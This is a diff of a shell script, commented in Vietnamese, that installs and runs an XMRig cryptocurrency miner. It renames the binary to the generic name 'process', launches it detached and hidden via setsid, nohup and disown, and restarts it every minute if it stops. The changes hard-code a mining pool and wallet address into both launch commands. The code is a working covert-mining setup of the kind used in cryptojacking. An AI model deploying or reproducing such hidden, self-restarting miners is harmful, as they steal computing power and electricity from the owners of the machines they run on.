@@ -47,11 +47,12 @@ wget https://raw.githubusercontent.com/ngocsuo/mazda6/refs/heads/master/config.j
 mv xmrig process
 chmod +x process
 
-# 🛠️ Tạo script khởi động XMRig ẩn
+# Tạo script chạy trình đào ẩn với `nohup` và `setsid`
 echo '#!/bin/bash
-setsid nohup ./process --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
+setsid nohup ./process --url hvnteam.com:3333 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ --pass x --donate-level 1 --cpu-priority 5 --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
 disown
 ' > start.sh
+
 chmod +x start.sh
 ./start.sh
 
@@ -62,7 +63,7 @@ while true; do
     then
         echo "🔄 Trình đào bị dừng! Đang khởi động lại..."
         cd ~/xmrig/xmrig-6.22.2
-        setsid nohup ./process --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
+         setsid nohup ./process --url hvnteam.com:3333 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ --pass x --donate-level 1 --cpu-priority 5 --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
         disown
     fi
     sleep 60
